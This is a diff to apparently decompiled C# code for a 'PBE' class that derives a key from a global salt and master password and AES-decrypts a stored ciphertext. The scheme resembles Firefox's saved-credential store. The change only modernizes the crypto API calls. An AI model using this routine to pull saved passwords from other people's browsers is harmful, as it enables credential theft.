@@ -41,17 +41,23 @@ public class PBE
     byte[] numArray1 = new byte[this.GlobalSalt.Length + this.MasterPass.Length];
     Buffer.BlockCopy((Array) this.GlobalSalt, 0, (Array) numArray1, 0, this.GlobalSalt.Length);
     Buffer.BlockCopy((Array) this.MasterPass, 0, (Array) numArray1, this.GlobalSalt.Length, this.MasterPass.Length);
-    byte[] hash = new SHA1Managed().ComputeHash(numArray1);
+    byte[] hash;
+    using (SHA1 managed = SHA1.Create())
+    {
+      hash = managed.ComputeHash(numArray1);
+    }
     byte[] src = new byte[2]{ (byte) 4, (byte) 14 };
     byte[] numArray2 = new byte[src.Length + this.PartIv.Length];
     Buffer.BlockCopy((Array) src, 0, (Array) numArray2, 0, src.Length);
     Buffer.BlockCopy((Array) this.PartIv, 0, (Array) numArray2, src.Length, this.PartIv.Length);
     byte[] bytes = new PBKDF2((HMAC) new HMACSHA256(), hash, this.EntrySalt, 1).GetBytes(32 /*0x20*/);
-    AesManaged aesManaged = new AesManaged();
-    aesManaged.Mode = CipherMode.CBC;
-    aesManaged.BlockSize = 128 /*0x80*/;
-    aesManaged.KeySize = 256 /*0x0100*/;
-    aesManaged.Padding = PaddingMode.Zeros;
-    return aesManaged.CreateDecryptor(bytes, numArray2).TransformFinalBlock(this.Ciphertext, 0, this.Ciphertext.Length);
+    using (Aes aes = Aes.Create())
+    {
+      aes.Mode = CipherMode.CBC;
+      aes.BlockSize = 128 /*0x80*/;
+      aes.KeySize = 256 /*0x0100*/;
+      aes.Padding = PaddingMode.Zeros;
+      return aes.CreateDecryptor(bytes, numArray2).TransformFinalBlock(this.Ciphertext, 0, this.Ciphertext.Length);
+    }
   }
 }
